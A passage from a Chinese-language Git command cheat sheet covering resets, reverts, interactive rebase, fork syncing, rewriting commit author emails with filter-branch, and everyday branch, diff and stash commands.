新建+切换到temp分支 </span>\ngit checkout <span class=\"hljs-literal\">master</span>\n</code></pre>\n<h3 id=\"最简单放弃本地修改内容\">最简单放弃本地修改内容</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 如果有的修改以及加入暂存区的话</span>\ngit reset <span class=\"hljs-comment\">--hard </span>\n<span class=\"hljs-comment\"># 还原所有修改，不会删除新增的文件</span>\ngit checkout . \n<span class=\"hljs-comment\"># 下面命令会删除新增的文件</span>\ngit clean -xdf\n</code></pre>\n<p>通过存储暂存区stash，在删除暂存区的方法放弃本地修改。</p>\n<pre><code class=\"language-shell\">git stash <span class=\"hljs-variable\">&amp;&amp;</span> git stash <span class=\"hljs-keyword\">drop</span> \n</code></pre>\n<h3 id=\"回滚到某个commit提交\">回滚到某个commit提交</h3>\n<pre><code class=\"language-shell\">git revert HEAD~<span class=\"hljs-number\">1</span> <span class=\"hljs-meta\"># 撤销一条记录 会弹出 commit 编辑</span>\ngit <span class=\"hljs-keyword\">push</span> <span class=\"hljs-meta\"># 提交回滚</span>\n</code></pre>\n<h3 id=\"回退到某一个版本\">回退到某一个版本</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">reset</span> <span class=\"hljs-comment\">--hard &lt;hash&gt;</span>\n# 例如 git <span class=\"hljs-keyword\">reset</span> <span class=\"hljs-comment\">--hard a3hd73r</span>\n# <span class=\"hljs-comment\">--hard代表丢弃工作区的修改，让工作区与版本代码一模一样，与之对应，</span>\n# <span class=\"hljs-comment\">--soft参数代表保留工作区的修改。</span>\n</code></pre>\n<h3 id=\"去掉某个commit\">去掉某个commit</h3>\n<pre><code class=\"language-shell\"># 实质是新建了一个与原来完全相反的<span class=\"hljs-keyword\">commit</span>，抵消了原来<span class=\"hljs-keyword\">commit</span>的效果\ngit revert <span class=\"hljs-operator\">&lt;</span><span class=\"hljs-keyword\">commit</span><span class=\"hljs-operator\">-</span>hash<span class=\"hljs-operator\">&gt;</span> \n</code></pre>\n<h3 id=\"新建一个空分支\">新建一个空分支</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 这种方式新建的分支(gh-pages)是没有 commit 记录的</span>\ngit checkout --orphan gh-pages\n<span class=\"hljs-comment\"># 删除新建的gh-pages分支原本的内容，如果不删除，提交将作为当前分支的第一个commit</span>\ngit rm -rf .\n<span class=\"hljs-comment\"># 查看一下状态 有可能上面一条命令，没有删除还没有提交的的文件</span>\ngit <span class=\"hljs-keyword\">state</span> \n</code></pre>\n<h3 id=\"合并多个commit\">合并多个commit</h3>\n<pre><code class=\"language-shell\"># 这个命令，将最近<span class=\"hljs-number\">4</span>个commit合并为<span class=\"hljs-number\">1</span>个，HEAD代表当前版本。\n# 将进入VIM界面，你可以修改提交信息。\ngit rebase -i HEAD~<span class=\"hljs-number\">4</span> \n# 可以看到其中分为两个部分，上方未注释的部分是填写要执行的指令，\n# 而下方注释的部分则是指令的提示说明。指令部分中由前方的命令名称、commit hash 和 commit message 组成\n# 当前我们只要知道 pick 和 squash 这两个命令即可。\n# --&gt; pick 的意思是要会执行这个 commit\n# --&gt; squash 的意思是这个 commit 会被合并到前一个commit\n\n# 我们将 需要保留的 这个 commit 前方的命令改成 squash 或 s，然后输入:wq以保存并退出\n# 这是我们会看到 commit message 的编辑界面\n\n# 其中, 非注释部分就是两次的 commit message, 你要做的就是将这两个修改成新的 commit message。\n# \n# 输入wq保存并推出, 再次输入git log查看 commit 历史信息，你会发现这两个 commit 已经合并了。\n# 将修改强制推送到前端\ngit push -f origin master\n</code></pre>\n<h3 id=\"修改远程commit记录\">修改远程Commit记录</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">git</span> commit --amend\n<span class=\"hljs-comment\"># amend只能修改没有提交到线上的，最后一次commit记录</span>\n<span class=\"hljs-attribute\">git</span> rebase -i HEAD~<span class=\"hljs-number\">3</span>\n<span class=\"hljs-comment\"># 表示要修改当前版本的倒数第三次状态</span>\n<span class=\"hljs-comment\"># 将要更改的记录行首单词 pick 改为 edit</span>\n<span class=\"hljs-attribute\">pick</span> <span class=\"hljs-number\">96</span>dc3f9 doc: Update quick-start.md\n<span class=\"hljs-attribute\">pick</span> f1cce8a test(Transition):Add transition test (#<span class=\"hljs-number\">47</span>)\n<span class=\"hljs-attribute\">pick</span> <span class=\"hljs-number\">6293516</span> feat(Divider): Add Divider component.\n<span class=\"hljs-comment\"># Rebase eeb03a4..6293516 onto eeb03a4 (3 commands)</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\"># Commands:</span>\n<span class=\"hljs-comment\"># p, pick = use commit</span>\n<span class=\"hljs-comment\"># r, reword = use commit, but edit the commit message</span>\n<span class=\"hljs-comment\"># e, edit = use commit, but stop for amending</span>\n<span class=\"hljs-comment\"># s, squash = use commit, but meld into previous commit</span>\n<span class=\"hljs-comment\"># f, fixup = like \"squash\", but discard this commit's log message</span>\n<span class=\"hljs-comment\"># x, exec = run command (the rest of the line) using shell</span>\n<span class=\"hljs-comment\"># d, drop = remove commit</span>\n</code></pre>\n<p>保存并退出，会弹出下面提示</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># You can amend the commit now, with</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\">#   git commit --amend</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\"># Once you are satisfied with your changes, run</span>\n<span class=\"hljs-comment\"># </span>\n<span class=\"hljs-comment\">#   git rebase --continue</span>\n\n<span class=\"hljs-comment\"># 通过这条命令进入编辑页面更改commit，保存退出</span>\ngit commit <span class=\"hljs-comment\">--amend</span>\n<span class=\"hljs-comment\"># 保存退出确认修改，继续执行 rebase, </span>\ngit rebase <span class=\"hljs-comment\">--continue</span>\n<span class=\"hljs-comment\"># 如果修改多条记录反复执行上面两条命令直到完成所有修改</span>\n\n<span class=\"hljs-comment\"># 最后，确保别人没有提交进行push，最好不要加 -f 强制推送</span>\ngit push -f origin master\n</code></pre>\n<h3 id=\"添加忽略文件\">添加忽略文件</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> node_modules/ &gt;&gt; <span class=\"hljs-string\">.gitignore</span>\n</code></pre>\n<h3 id=\"利用commit关闭一个issue\">利用commit关闭一个issue</h3>\n<p>这个功能在Github上可以玩儿，Gitlab上特别老的版本不能玩儿哦，那么如何跟随着commit关闭一个issue呢? 在confirm merge的时候可以使用一下命令来关闭相关issue:  </p>\n<p><code>fixes #xxx</code>、 <code>fixed #xxx</code>、 <code>fix #xxx</code>、 <code>closes #xxx</code>、 <code>close #xxx</code>、 <code>closed #xxx</code>、</p>\n<h3 id=\"同步fork的上游仓库\">同步fork的上游仓库</h3>\n<p><a href=\"https://help.github.com/articles/syncing-a-fork/\">Github教程同步fork教程</a>，<a href=\"http://www.miss77.net/549.html\">在Github上同步一个分支(fork)</a>  </p>\n<p><strong>设置添加多个远程仓库地址。</strong></p>\n<p>在同步之前，需要创建一个远程点指向上游仓库(repo).如果你已经派生了一个原始仓库，可以按照如下方法做。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">$</span> git remote -v\n# List the current remotes （列出当前远程仓库）\n# origin  https:<span class=\"hljs-comment\">//github.com/user/repo.git (fetch)</span>\n# origin  https:<span class=\"hljs-comment\">//github.com/user/repo.git (push)</span>\n<span class=\"hljs-symbol\">$</span> git remote add upstream https:<span class=\"hljs-comment\">//github.com/otheruser/repo.git</span>\n# <span class=\"hljs-keyword\">Set</span> a <span class=\"hljs-comment\">new remote (</span>设置一个新的远程仓库<span class=\"hljs-comment\">)</span>\n$ git <span class=\"hljs-comment\">remote -v</span>\n# Verify <span class=\"hljs-comment\">new remote (</span>验证新的原唱仓库<span class=\"hljs-comment\">)</span>\n# origin    <span class=\"hljs-comment\">https:</span>//<span class=\"hljs-comment\">github.com</span>/user/<span class=\"hljs-comment\">repo.git (fetch)</span>\n# origin    <span class=\"hljs-comment\">https:</span>//<span class=\"hljs-comment\">github.com</span>/user/<span class=\"hljs-comment\">repo.git (push)</span>\n# upstream  <span class=\"hljs-comment\">https:</span>//<span class=\"hljs-comment\">github.com</span>/otheruser/<span class=\"hljs-comment\">repo.git (fetch)</span>\n# upstream  <span class=\"hljs-comment\">https:</span>//<span class=\"hljs-comment\">github.com</span>/otheruser/<span class=\"hljs-comment\">repo.git (push)</span>\n</code></pre>\n<p><strong>同步更新仓库内容</strong></p>\n<p>同步上游仓库到你的仓库需要执行两步：首先你需要从远程拉去，之后你需要合并你希望的分支到你的本地副本分支。从上游的存储库中提取分支以及各自的提交内容。 <code>master</code> 将被存储在本地分支机构 <code>upstream/master</code></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">git</span> fetch upstream\n<span class=\"hljs-comment\"># remote: Counting objects: 75, done.</span>\n<span class=\"hljs-comment\"># remote: Compressing objects: 100% (53/53), done.</span>\n<span class=\"hljs-comment\"># remote: Total 62 (delta 27), reused 44 (delta 9)</span>\n<span class=\"hljs-comment\"># Unpacking objects: 100% (62/62), done.</span>\n<span class=\"hljs-comment\"># From https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY</span>\n<span class=\"hljs-comment\">#  * [new branch]      master     -&gt; upstream/master</span>\n</code></pre>\n<p>检查你的 fork's 本地 <code>master</code> 分支</p>\n<pre><code class=\"language-shell\">git checkout <span class=\"hljs-keyword\">master</span>\n<span class=\"hljs-title\"># Switched</span> to branch '<span class=\"hljs-literal\">master</span>'\n</code></pre>\n<p>合并来自 <code>upstream/master</code> 的更改到本地 master  分支上。  这使你的前 fork's <code>master</code> 分支与上游资源库同步，而不会丢失你本地修改。  </p>\n<pre><code class=\"language-shell\">git merge upstream/<span class=\"hljs-keyword\">master</span>\n<span class=\"hljs-title\"># Updating</span> a422352..<span class=\"hljs-number\">5</span>fdff0f\n<span class=\"hljs-comment\"># Fast-forward</span>\n<span class=\"hljs-comment\">#  README                    |    9 -------</span>\n<span class=\"hljs-comment\">#  README.md                 |    7 ++++++</span>\n<span class=\"hljs-comment\">#  2 files changed, 7 insertions(+), 9 deletions(-)</span>\n<span class=\"hljs-comment\">#  delete mode 100644 README</span>\n<span class=\"hljs-comment\">#  create mode 100644 README.md</span>\n</code></pre>\n<h3 id=\"批量修改历史commit中的名字和邮箱\">批量修改历史commit中的名字和邮箱</h3>\n<p><strong>1.克隆仓库</strong></p>\n<p>注意参数，这个不是普通的clone，clone下来的仓库并不能参与开发</p>\n<pre><code class=\"language-shell\">git clone --bare https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/user/</span>repo.git\ncd repo.git\n</code></pre>\n<p><strong>2.命令行中运行代码</strong></p>\n<p>OLD_EMAIL原来的邮箱<br>CORRECT_NAME更正的名字<br>CORRECT_EMAIL更正的邮箱  </p>\n<p>将下面代码复制放到命令行中执行</p>\n<pre><code class=\"language-shell\">git filter-branch -f --env-filter '\nOLD_EMAIL=<span class=\"hljs-string\">\"wowohoo@qq.com\"</span>\nCORRECT_NAME=<span class=\"hljs-string\">\"小弟调调\"</span>\nCORRECT_EMAIL=<span class=\"hljs-string\">\"更正的邮箱@qq.com\"</span>\n<span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$GIT_COMMITTER_EMAIL</span>\"</span> = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$OLD_EMAIL</span>\"</span> ]\nthen\n    <span class=\"hljs-keyword\">export</span> GIT_COMMITTER_NAME=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$CORRECT_NAME</span>\"</span>\n    <span class=\"hljs-keyword\">export</span> GIT_COMMITTER_EMAIL=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$CORRECT_EMAIL</span>\"</span>\nfi\n<span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$GIT_AUTHOR_EMAIL</span>\"</span> = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$OLD_EMAIL</span>\"</span> ]\nthen\n    <span class=\"hljs-keyword\">export</span> GIT_AUTHOR_NAME=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$CORRECT_NAME</span>\"</span>\n    <span class=\"hljs-keyword\">export</span> GIT_AUTHOR_EMAIL=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$CORRECT_EMAIL</span>\"</span>\nfi\n' --tag-name-filter cat -- --branches --tags\n</code></pre>\n<p>执行过程</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Rewrite</span> <span class=\"hljs-number\">160</span>d4df2689ff6df3820563bfd13b5f1fb9ba832 (<span class=\"hljs-number\">479</span>/<span class=\"hljs-number\">508</span>) (<span class=\"hljs-number\">16</span> seconds passed, remaining <span class=\"hljs-number\">0</span> predicted)\n<span class=\"hljs-attribute\">Ref</span> 'refs/heads/dev' was rewritten\n<span class=\"hljs-attribute\">Ref</span> 'refs/heads/master' was rewritten\n</code></pre>\n<p><strong>3.同步到远程仓库</strong></p>\n<p>同步到push远程git仓库</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">git</span> <span class=\"hljs-string\">push</span> <span class=\"hljs-built_in\">--force</span> <span class=\"hljs-built_in\">--tags</span> <span class=\"hljs-string\">origin</span> <span class=\"hljs-string\">'refs/heads/*'</span>\n</code></pre>\n<p>我还遇到了如下面错误，lab默认给master分支加了保护，不允许强制覆盖。<code>Project(项目)</code>-&gt;<code>Setting</code>-&gt;<code>Repository</code> 菜单下面的<code>Protected branches</code>把master的保护去掉就可以了。修改完之后，建议把master的保护再加回来，毕竟强推不是件好事。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">remote: GitLab: You are not allowed to force push code to a protected branch on this project.</span>\n</code></pre>\n<p>当上面的push 不上去的时候，先 <code>git pull</code> 确保最新代码</p>\n<pre><code class=\"language-shell\">git pull  --allow-unrelated-histories\n<span class=\"hljs-comment\"># 或者指定分枝</span>\ngit pull origin <span class=\"hljs-keyword\">master</span> <span class=\"hljs-title\">--allow-unrelated-histories</span>\n</code></pre>\n<h3 id=\"查看某个文件历史\">查看某个文件历史</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-built_in\">log</span> --pretty=oneline 文件名  <span class=\"hljs-meta\"># 列出文件的所有改动历史  </span>\ngit <span class=\"hljs-keyword\">show</span> c178bf49   <span class=\"hljs-meta\"># 某次的改动的修改记录  </span>\ngit <span class=\"hljs-built_in\">log</span> -p c178bf49 <span class=\"hljs-meta\"># 某次的改动的修改记录  </span>\ngit blame 文件名     <span class=\"hljs-meta\"># 显示文件的每一行是在那个版本最后修改。  </span>\ngit whatchanged 文件名  <span class=\"hljs-meta\"># 显示某个文件的每个版本提交信息：提交日期，提交人员，版本号，提交备注（没有修改细节）  </span>\n</code></pre>\n<h3 id=\"打造自己的git命令\">打造自己的git命令</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">config</span> --<span class=\"hljs-keyword\">global</span> <span class=\"hljs-keyword\">alias</span><span class=\"hljs-variable\">.st</span> status\ngit <span class=\"hljs-keyword\">config</span> --<span class=\"hljs-keyword\">global</span> <span class=\"hljs-keyword\">alias</span><span class=\"hljs-variable\">.br</span> branch\ngit <span class=\"hljs-keyword\">config</span> --<span class=\"hljs-keyword\">global</span> <span class=\"hljs-keyword\">alias</span><span class=\"hljs-variable\">.co</span> checkout\ngit <span class=\"hljs-keyword\">config</span> --<span class=\"hljs-keyword\">global</span> <span class=\"hljs-keyword\">alias</span><span class=\"hljs-variable\">.ci</span> commit\n</code></pre>\n<p>配置好后再输入git命令的时候就不用再输入一大段了，例如我们要查看状态，只需：</p>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">st</span>\n</code></pre>\n<h3 id=\"中文乱码的解决方案\">中文乱码的解决方案</h3>\n<pre><code class=\"language-shell\">git config --global core.quotepath <span class=\"hljs-literal\">false</span>\n</code></pre>\n<h2 id=\"新建仓库\">新建仓库</h2>\n<h3 id=\"init\">init</h3>\n<p><code>git init</code> #初始化  </p>\n<h3 id=\"status\">status</h3>\n<p><code>git status</code> #获取状态  </p>\n<h3 id=\"add\">add</h3>\n<p><code>git add file</code> # .或*代表全部添加<br><code>git rm --cached &lt;added_file_to_undo&gt;</code> # 在commit之前撤销git add操作<br><code>git reset head</code> # 好像比上面<code>git rm --cached</code>更方便  </p>\n<h3 id=\"commit\">commit</h3>\n<p><code>git commit -m \"message\"</code> #此处注意乱码  </p>\n<h3 id=\"remote\">remote</h3>\n<p><code>git remote add origin git@github.com:JSLite/test.git</code> #添加源  </p>\n<h3 id=\"push\">push</h3>\n<pre><code class=\"language-shell\">git push -u origin <span class=\"hljs-keyword\">master</span> <span class=\"hljs-title\"># push</span>同事设置默认跟踪分支  \ngit push origin <span class=\"hljs-keyword\">master</span>  \n<span class=\"hljs-title\">git</span> push -f origin <span class=\"hljs-keyword\">master</span> <span class=\"hljs-title\"># 强制推送文件，缩写 -f</span>（全写--force）\n</code></pre>\n<h2 id=\"clone\">clone</h2>\n<p><code>git clone git://github.com/JSLite/JSLite.js.git </code><br><code>git clone git://github.com/JSLite/JSLite.js.git mypro</code> #克隆到自定义文件夹<br><code>git clone [user@]example.com:path/to/repo.git/</code> #SSH协议还有另一种写法。  </p>\n<p>git clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。<code>git clone &lt;版本库的网址&gt; &lt;本地目录名&gt;</code>  </p>\n<pre><code class=\"language-shell\">$ git clone http[s]:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone ssh:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone git:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone <span class=\"hljs-regexp\">/opt/gi</span>t/project.git \n$ git clone file:<span class=\"hljs-regexp\">//</span><span class=\"hljs-regexp\">/opt/gi</span>t/project.git\n$ git clone ftp[s]:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n$ git clone rsync:<span class=\"hljs-regexp\">//</span>example.com<span class=\"hljs-regexp\">/path/</span>to<span class=\"hljs-regexp\">/repo.git/</span>\n</code></pre>\n<h2 id=\"本地\">本地</h2>\n<h3 id=\"help\">help</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-built_in\">help</span> config <span class=\"hljs-comment\"># 获取帮助信息  </span>\n</code></pre>\n<h3 id=\"add-1\">add</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">add</span> *   <span class=\"hljs-meta\"># 跟踪新文件   </span>\ngit <span class=\"hljs-keyword\">add</span> -u [path]   <span class=\"hljs-meta\"># 添加[指定路径下]已跟踪文件   </span>\n</code></pre>\n<h3 id=\"rm\">rm</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">rm</span> *&amp;git <span class=\"hljs-built_in\">rm</span> *          <span class=\"hljs-comment\"># 移除文件  </span>\ngit <span class=\"hljs-built_in\">rm</span> <span class=\"hljs-operator\">-f</span> *            <span class=\"hljs-comment\"># 移除文件  </span>\ngit <span class=\"hljs-built_in\">rm</span> -<span class=\"hljs-literal\">-cached</span> *      <span class=\"hljs-comment\"># 取消跟踪  </span>\ngit <span class=\"hljs-built_in\">mv</span> file_from file_to  <span class=\"hljs-comment\"># 重命名跟踪文件  </span>\ngit log   <span class=\"hljs-comment\"># 查看提交记录  </span>\n</code></pre>\n<h3 id=\"commit-1\">commit</h3>\n<pre><code class=\"language-shell\">git commit <span class=\"hljs-comment\">#提交更新   </span>\ngit commit -m <span class=\"hljs-string\">'message'</span> <span class=\"hljs-comment\">#提交说明   </span>\ngit commit -<span class=\"hljs-keyword\">a</span> <span class=\"hljs-comment\">#跳过使用暂存区域，把所有已经跟踪过的文件暂存起来一并提交   </span>\ngit commit <span class=\"hljs-comment\">--amend #修改最后一次提交   </span>\ngit commit <span class=\"hljs-built_in\">log</span> <span class=\"hljs-comment\">#查看所有提交，包括没有push的commit    </span>\ngit commit -m <span class=\"hljs-string\">\"#133\"</span> <span class=\"hljs-comment\">#关联issue 任意位置带上# 符号加上issue号码  </span>\ngit commit -m <span class=\"hljs-string\">\"fix #133\"</span> commit关闭issue  \ngit commit -m <span class=\"hljs-string\">'概要描述'</span>$<span class=\"hljs-string\">'\\n\\n'</span><span class=\"hljs-string\">'1.详细描述'</span>$<span class=\"hljs-string\">'\\n'</span><span class=\"hljs-string\">'2.详细描述'</span> <span class=\"hljs-comment\">#提交简要描述和详细描述  </span>\n</code></pre>\n<h3 id=\"reset\">reset</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">reset</span> HEAD *  <span class=\"hljs-comment\"># 取消已经暂存的文件   </span>\ngit <span class=\"hljs-keyword\">reset</span> --mixed HEAD * <span class=\"hljs-comment\"># 同上   </span>\ngit <span class=\"hljs-keyword\">reset</span> --soft HEAD *  <span class=\"hljs-comment\"># 重置到指定状态，不会修改索引区和工作树   </span>\ngit <span class=\"hljs-keyword\">reset</span> --hard HEAD *  <span class=\"hljs-comment\"># 重置到指定状态，会修改索引区和工作树   </span>\ngit <span class=\"hljs-keyword\">reset</span> -- files *     <span class=\"hljs-comment\"># 重置index区文件   </span>\n</code></pre>\n<h3 id=\"revert\">revert</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">git</span> revert HEAD   <span class=\"hljs-comment\"># 撤销前一次操作   </span>\ngit revert HEAD<span class=\"hljs-regexp\">~  #</span> 撤销前前一次操作   \ngit revert commit <span class=\"hljs-comment\"># 撤销指定操作   </span>\n</code></pre>\n<h3 id=\"checkout\">checkout</h3>\n<pre><code class=\"language-shell\">git checkout -- file  <span class=\"hljs-comment\"># 取消对文件的修改（从暂存区——覆盖worktree file）  </span>\ngit checkout <span class=\"hljs-keyword\">branch|tag|commit </span>-- file_name  <span class=\"hljs-comment\"># 从仓库取出file覆盖当前分支   </span>\ngit checkout HEAD~<span class=\"hljs-number\">1</span> [文件]  <span class=\"hljs-comment\"># 将会更新 working directory 去匹配某次 commit   </span>\ngit checkout -- .          <span class=\"hljs-comment\"># 从暂存区取出文件覆盖工作区   </span>\ngit checkout -<span class=\"hljs-keyword\">b </span>gh-pages  <span class=\"hljs-number\">0</span>c304c9  <span class=\"hljs-comment\"># 这个表示 从当前分支 commit 哈希值为 0c304c9 的节点，分一个新的分支gh-pages出来，并切换到 gh-pages   </span>\n</code></pre>\n<h3 id=\"diff\">diff</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">diff </span>file     <span class=\"hljs-comment\"># 查看指定文件的差异   </span>\ngit <span class=\"hljs-keyword\">diff </span>--stat   <span class=\"hljs-comment\"># 查看简单的diff结果   </span>\ngit <span class=\"hljs-keyword\">diff </span> <span class=\"hljs-comment\"># 比较Worktree和Index之间的差异   </span>\ngit <span class=\"hljs-keyword\">diff </span>--<span class=\"hljs-keyword\">cached </span>  <span class=\"hljs-comment\"># 比较Index和HEAD之间的差异   </span>\ngit <span class=\"hljs-keyword\">diff </span>HEAD       <span class=\"hljs-comment\"># 比较Worktree和HEAD之间的差异   </span>\ngit <span class=\"hljs-keyword\">diff </span><span class=\"hljs-keyword\">branch </span>    <span class=\"hljs-comment\"># 比较Worktree和branch之间的差异   </span>\ngit <span class=\"hljs-keyword\">diff </span><span class=\"hljs-keyword\">branch1 </span><span class=\"hljs-keyword\">branch2 </span> <span class=\"hljs-comment\"># 比较两次分支之间的差异   </span>\ngit <span class=\"hljs-keyword\">diff </span>commit commit    <span class=\"hljs-comment\"># 比较两次提交之间的差异   </span>\ngit <span class=\"hljs-keyword\">diff </span>master..test   <span class=\"hljs-comment\"># 上面这条命令只显示两个分支间的差异  </span>\ngit <span class=\"hljs-keyword\">diff </span>master...test    <span class=\"hljs-comment\"># 你想找出‘master’,‘test’的共有 父分支和'test'分支之间的差异，你用3个‘.'来取代前面的两个'.'  </span>\n</code></pre>\n<h3 id=\"stash\">stash</h3>\n<pre><code class=\"language-shell\">git stash <span class=\"hljs-comment\"># 将工作区现场（已跟踪文件）储藏起来，等以后恢复后继续工作。   </span>\ngit stash list  <span class=\"hljs-comment\"># 查看保存的工作现场   </span>\ngit stash apply <span class=\"hljs-comment\"># 恢复工作现场   </span>\ngit stash drop  <span class=\"hljs-comment\"># 删除stash内容   </span>\ngit stash <span class=\"hljs-keyword\">pop</span>   <span class=\"hljs-comment\"># 恢复的同时直接删除stash内容   </span>\ngit stash apply stash@{0} <span class=\"hljs-comment\"># 恢复指定的工作现场，当你保存了不只一份工作现场时。   </span>\n</code></pre>\n<h3 id=\"merge\">merge</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">merge</span> --squash <span class=\"hljs-keyword\">test</span> # 合并压缩，将<span class=\"hljs-keyword\">test</span>上的commit压缩为一条   \n</code></pre>\n<h3 id=\"cherry-pick\">cherry-pick</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">git</span> cherry-pick commit    <span class=\"hljs-comment\"># 拣选合并，将commit合并到当前分支   </span>\ngit cherry-pick -n commit <span class=\"hljs-comment\"># 拣选多个提交，合并完后可以继续拣选下一个提交   </span>\n</code></pre>\n<h3 id=\"rebase\">rebase</h3>\n<pre><code class=\"language-shell\">git rebase <span class=\"hljs-keyword\">master</span>   <span class=\"hljs-title\"># 将master</span>分之上超前的提交，变基到当前分支  \ngit rebase --onto <span class=\"hljs-keyword\">master</span> <span class=\"hljs-title\">169a6</span>  <span class=\"hljs-comment\"># 限制回滚范围，rebase当前分支从169a6以后的提交  </span>\ngit rebase --interactive <span class=\"hljs-comment\"># 交互模式，修改commit   </span>\ngit rebase --continue    <span class=\"hljs-comment\"># 处理完冲突继续合并   </span>\ngit rebase --skip        <span class=\"hljs-comment\"># 跳过   </span>\ngit rebase --abort       <span class=\"hljs-comment\"># 取消合并    </span>\n</code></pre>\n<h2 id=\"分支branch\">分支branch</h2>\n<h3 id=\"删除\">删除</h3>\n<pre><code class=\"language-shell\">git push <span class=\"hljs-keyword\">origin </span>:<span class=\"hljs-keyword\">branchName </span> <span class=\"hljs-comment\"># 删除远程分支  </span>\ngit push <span class=\"hljs-keyword\">origin </span>--delete new <span class=\"hljs-comment\"># 删除远程分支new   </span>\ngit <span class=\"hljs-keyword\">branch </span>-d <span class=\"hljs-keyword\">branchName </span>    <span class=\"hljs-comment\"># 删除本地分支，强制删除用-D  </span>\ngit <span class=\"hljs-keyword\">branch </span>-d test      <span class=\"hljs-comment\"># 删除本地test分支   </span>\ngit <span class=\"hljs-keyword\">branch </span>-D test      <span class=\"hljs-comment\"># 强制删除本地test分支   </span>\ngit remote prune <span class=\"hljs-keyword\">origin </span><span class=\"hljs-comment\"># 远程删除了，本地还能看到远程存在，这条命令删除远程不存在的分支</span>\n</code></pre>\n<h3 id=\"提交\">提交</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-built_in\">push</span> -u <span class=\"hljs-built_in\">origin</span> branchName # 提交分支到远程<span class=\"hljs-built_in\">origin</span>主机中  \n</code></pre>\n<h3 id=\"拉取\">拉取</h3>\n<p><code>git fetch -p</code> #拉取远程分支时，自动清理 远程分支已删除，本地还存在的对应同名分支。  </p>\n<h3 id=\"分支合并\">分支合并</h3>\n<pre><code class=\"language-shell\">git merge branchName      <span class=\"hljs-comment\"># 合并分支 - 将分支branchName和当前所在分支合并   </span>\ngit merge origin/<span class=\"hljs-keyword\">master</span>   <span class=\"hljs-title\"># 在本地分支上合并远程分支。   \ngit</span> rebase origin/<span class=\"hljs-keyword\">master</span>  <span class=\"hljs-title\"># 在本地分支上合并远程分支。   \ngit</span> merge test            <span class=\"hljs-comment\"># 将test分支合并到当前分支   </span>\n</code></pre>\n<h3 id=\"重命名\">重命名</h3>\n<p><code>git branch -m old new</code> #重命名分支  </p>\n<h3 id=\"查看\">查看</h3>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">branch </span>     <span class=\"hljs-comment\"># 列出本地分支   </span>\ngit <span class=\"hljs-keyword\">branch </span>-r   <span class=\"hljs-comment\"># 列出远端分支   </span>\ngit <span class=\"hljs-keyword\">branch </span>-a   <span class=\"hljs-comment\"># 列出所有分支   </span>\ngit <span class=\"hljs-keyword\">branch </span>-v   <span class=\"hljs-comment\"># 查看各个分支最后一个提交对象的信息   </span>\ngit <span class=\"hljs-keyword\">branch </span>--merge      <span class=\"hljs-comment\"># 查看已经合并到当前分支的分支   </span>\ngit <span class=\"hljs-keyword\">branch </span>--no-merge   <span class=\"hljs-comment\"># 查看为合并到当前分支的分支   </span>\ngit remote <span class=\"hljs-keyword\">show </span><span class=\"hljs-keyword\">origin </span> <span class=\"hljs-comment\"># 可以查看remote地址，远程分支</span>\n</code></pre>\n<h3 id=\"新建\">新建</h3>\n<pre><code class=\"language-shell\">git branch test <span class=\"hljs-meta\"># 新建test分支  </span>\ngit branch <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">Brach</span> <span class=\"hljs-number\">3</span>defc69 <span class=\"hljs-meta\"># 指定哈希3defc69，新建分支名字为newBrach</span>\ngit checkout -b <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">Brach</span> origin/master <span class=\"hljs-meta\"># 取回远程主机的更新以后，在它的基础上创建一个新的分支  </span>\ngit checkout -b <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">Brach</span> <span class=\"hljs-number\">3</span>defc69 <span class=\"hljs-meta\"># 